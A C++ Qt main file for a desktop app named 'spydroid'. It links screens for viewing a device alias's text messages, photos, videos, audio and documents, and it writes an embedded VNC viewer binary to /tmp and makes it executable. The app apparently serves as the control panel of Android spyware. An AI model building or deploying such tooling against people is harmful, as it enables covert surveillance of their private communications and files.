/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

#include <QApplication>
#include <QStackedWidget>
#include <QFile>
#include <QString>
#include <QPointer>
#include <fstream>
#include <iostream>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include "res/bin/vnc_viewer.h"
#include "presentation/HomeScreen.h"
#include "presentation/DashBoardScreen.h"
#include "presentation/SmsScreen.h"
#include "presentation/MultimediaScreen.h"
#include "presentation/ImagesScreen.h"
#include "presentation/VideosScreen.h"
#include "presentation/AudiosScreen.h"
#include "presentation/DocumentsScreen.h"

void navigateTo(QStackedWidget& widget, int index, const QString& title) {
    widget.setCurrentIndex(index);
    widget.setWindowTitle(title);
}

int main(int argc, char *argv[]) {
    std::string filePath = "/tmp/vnc_viewer";

    // Si el archivo no existe, crea el archivo binario y cambia permisos
    if (access(filePath.c_str(), F_OK) == -1) {
        std::ofstream outfile(filePath, std::ios::binary);
        outfile.write(reinterpret_cast<const char*>(vncviewer), vncviewer_len);
        outfile.close();

        // Cambiar permisos usando QFile en lugar de system()
        QFile file(filePath.c_str());
        file.setPermissions(QFile::ExeOwner | QFile::ReadOwner | QFile::WriteOwner);
    }

    QApplication app(argc, argv);

    QStackedWidget stackedWidget;

    // Uso de QPointer para manejar automáticamente la vida de los widgets
    QPointer<HomeScreen> homeScreen = new HomeScreen(&stackedWidget);
    QPointer<DashBoardScreen> dashBoardScreen = new DashBoardScreen(&stackedWidget);
    QPointer<SmsScreen> smsScreen = new SmsScreen(&stackedWidget);
    QPointer<MultimediaScreen> multimediaScreen = new MultimediaScreen(&stackedWidget);
    QPointer<ImagesScreen> imagesScreen = new ImagesScreen(&stackedWidget);
    QPointer<VideosScreen> videosScreen = new VideosScreen(&stackedWidget);
    QPointer<AudiosScreen> audiosScreen = new AudiosScreen(&stackedWidget);
    QPointer<DocumentsScreen> documentsScreen = new DocumentsScreen(&stackedWidget);

    // Añadir widgets al QStackedWidget
    stackedWidget.addWidget(homeScreen);                    // Índice 0
    stackedWidget.addWidget(dashBoardScreen);               // Índice 1
    stackedWidget.addWidget(multimediaScreen);              // Índice 2
    stackedWidget.addWidget(smsScreen);                     // Índice 3
    stackedWidget.addWidget(imagesScreen);                  // Índice 4
    stackedWidget.addWidget(videosScreen);                  // Índice 5
    stackedWidget.addWidget(audiosScreen);                  // Índice 6
    stackedWidget.addWidget(documentsScreen);               // Índice 7

    // Mostrar la vista inicial
    stackedWidget.setCurrentIndex(0);
    stackedWidget.showMaximized();
    stackedWidget.setWindowTitle("spydroid");

    // Conexiones de navegación
    QObject::connect(homeScreen, &HomeScreen::goToDashBoard, [&stackedWidget]() {
        navigateTo(stackedWidget, 1, "Información general");
    });

    QObject::connect(dashBoardScreen, &DashBoardScreen::goToHome, [&stackedWidget]() {
        navigateTo(stackedWidget, 0, "spydroid");
    });

    QObject::connect(dashBoardScreen, &DashBoardScreen::goToMultimedia, [&stackedWidget, multimediaScreen](const QString& alias) {
        multimediaScreen->setAlias(alias);
        navigateTo(stackedWidget, 2, "Archivos multimedia de " + alias);
    });
    
    QObject::connect(dashBoardScreen, &DashBoardScreen::goToSms, [&stackedWidget, smsScreen](const QString& alias) {
        if (smsScreen) {  // Verifica que smsScreen es válido
            smsScreen->setAlias(alias);
            navigateTo(stackedWidget, 3, "Mensajes de texto de " + alias);
        } else {
            qWarning() << "smsScreen no está disponible.";
        }
    });
    

    QObject::connect(smsScreen, &SmsScreen::goToDashBoard, [&stackedWidget]() {
        stackedWidget.setCurrentIndex(1);  // Cambiar al DashBoard al hacer clic
    });


    QObject::connect(multimediaScreen, &MultimediaScreen::goToDashBoard, [&stackedWidget]() {
        navigateTo(stackedWidget, 1, "Información general");
    });

    QObject::connect(multimediaScreen, &MultimediaScreen::goToImages, [&stackedWidget, imagesScreen](const QString& alias) {
        imagesScreen->setAlias(alias);
        navigateTo(stackedWidget, 4, "Imágenes de " + alias);
    });


    QObject::connect(multimediaScreen, &MultimediaScreen::goToVideos, [&stackedWidget, videosScreen](const QString& alias) {
        videosScreen->setAlias(alias);
        navigateTo(stackedWidget, 5, "Videos de " + alias);
    });

    QObject::connect(multimediaScreen, &MultimediaScreen::goToAudios, [&stackedWidget, audiosScreen](const QString& alias) {
        audiosScreen->setAlias(alias);
        navigateTo(stackedWidget, 6, "Audios de " + alias);
    });

    QObject::connect(multimediaScreen, &MultimediaScreen::goToDocuments, [&stackedWidget, documentsScreen](const QString& alias) {
        documentsScreen->setAlias(alias);
        navigateTo(stackedWidget, 7, "Documentos de " + alias);
    });

    QObject::connect(imagesScreen, &ImagesScreen::goToMultimedia, [&stackedWidget](const QString& alias) {
        navigateTo(stackedWidget, 2, "Archivos multimedia de " + alias);
    });

    QObject::connect(videosScreen, &VideosScreen::goToMultimedia, [&stackedWidget](const QString& alias) {
        navigateTo(stackedWidget, 2, "Archivos multimedia de " + alias);
    });

    QObject::connect(audiosScreen, &AudiosScreen::goToMultimedia, [&stackedWidget](const QString& alias) {
        navigateTo(stackedWidget, 2, "Archivos multimedia de " + alias);
    });

    QObject::connect(documentsScreen, &DocumentsScreen::goToMultimedia, [&stackedWidget](const QString& alias) {
        navigateTo(stackedWidget, 2, "Archivos multimedia de " + alias);
    });

    return app.exec();
}